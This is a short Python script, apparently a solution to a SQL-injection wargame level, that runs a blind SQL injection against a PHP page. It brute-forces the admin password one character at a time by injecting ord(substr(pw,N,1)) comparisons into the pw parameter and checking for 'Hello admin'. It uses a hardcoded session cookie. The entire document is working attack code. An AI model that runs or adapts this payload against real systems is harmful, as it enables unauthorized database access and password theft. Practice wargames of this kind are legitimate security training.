import requests

password=''
for admin_len in range(9,11) :
    for admin_pass in range(128,255) :
        URL='http://los.eagle-jump.org/xavis_fd4389515d6540477114ec3c79623afe.php?'
        query={'pw': '\' or ord(substr(pw,'+str(admin_len+1)+',1))='+str(admin_pass)+'-- '}
        headers = {'Content-Type': 'application/json; charset=utf-8'}
        cookies = {'PHPSESSID': 'ean08as37ebof2v307j3kurer3'}
        res=requests.get(URL, params=query, headers=headers, cookies=cookies)
        if("Hello admin" in res.text):
            print(admin_len,' : ',str(admin_pass))
            break
    print("one cycle complete")